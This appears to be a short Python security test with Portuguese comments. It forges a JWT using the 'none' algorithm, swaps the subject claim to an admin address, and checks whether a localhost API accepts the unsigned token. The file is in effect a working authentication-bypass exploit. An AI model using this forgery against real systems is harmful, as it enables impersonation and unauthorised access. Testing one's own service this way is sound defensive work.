import jwt
import requests

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyQGV4YW1wbGUuY29tIn0.Rfzkd7MPH7_1lr9xY9Ma0W1t3K3WWs7Yx6U7o6gO9Jw"
payload = jwt.decode(token, options={"verify_signature": False})
payload['sub'] = 'admin@corp.com'
#Retornou um problema de assinatura, mas o payload foi modificado com sucesso ("none" em vez de None)
token_anomalo = jwt.encode(payload, None, algorithm=None)
url = 'http://localhost:8080/api/documents/1'
headers = {'Authorization': f'Bearer {token_anomalo}'}
response = requests.get(url, headers=headers)
if response.status_code == 200:
    print("Aviso: Servidor retornou status 200 em vez do esperado 401/403")
else:
    print("Resposta esperada: ", response.status_code)
